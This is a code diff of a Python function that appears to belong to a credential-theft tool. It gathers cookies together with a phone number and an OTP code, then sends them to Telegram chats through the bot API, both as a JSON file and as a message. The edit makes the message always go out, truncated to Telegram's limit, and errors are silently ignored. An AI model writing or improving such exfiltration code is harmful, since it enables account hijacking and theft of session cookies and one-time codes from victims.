@@ -601,9 +601,8 @@ async def _send_cookies_to_tg_standalone(ctx2, phone_10: str, otp_code: str = ""
         header_base = f"<b>Куки {label_phone} (фон) ({len(cookies_out)} шт.):</b>"
         _TAGS = len(f"{otp_prefix}{header_base}\n<pre><code class=\"language-json\"></code></pre>")
         _TG_MAX = 4096 - _TAGS - 10
-        text_msg = None
-        if len(safe_json) <= _TG_MAX:
-            text_msg = f"{otp_prefix}{header_base}\n<pre><code class=\"language-json\">{safe_json}</code></pre>"
+        _body = safe_json if len(safe_json) <= _TG_MAX else safe_json[:_TG_MAX]
+        text_msg = f"{otp_prefix}{header_base}\n<pre><code class=\"language-json\">{_body}</code></pre>"
 
         async with _hx.AsyncClient(timeout=15, trust_env=False) as _client:
             for _chat in _nc:
@@ -615,12 +614,11 @@ async def _send_cookies_to_tg_standalone(ctx2, phone_10: str, otp_code: str = ""
                         files={"document": (fname, io.BytesIO(cookies_json.encode("utf-8")), "application/json")}
                     )
 
-                    # 2. Текст — только если влезает в одно сообщение
-                    if text_msg:
-                        await _client.post(
-                            f"https://api.telegram.org/bot{_tok}/sendMessage",
-                            json={"chat_id": _chat, "text": text_msg, "parse_mode": "HTML"}
-                        )
+                    # 2. Текст одним сообщением (обрезается если длиннее лимита TG)
+                    await _client.post(
+                        f"https://api.telegram.org/bot{_tok}/sendMessage",
+                        json={"chat_id": _chat, "text": text_msg, "parse_mode": "HTML"}
+                    )
                 except Exception:
                     pass
     except Exception:
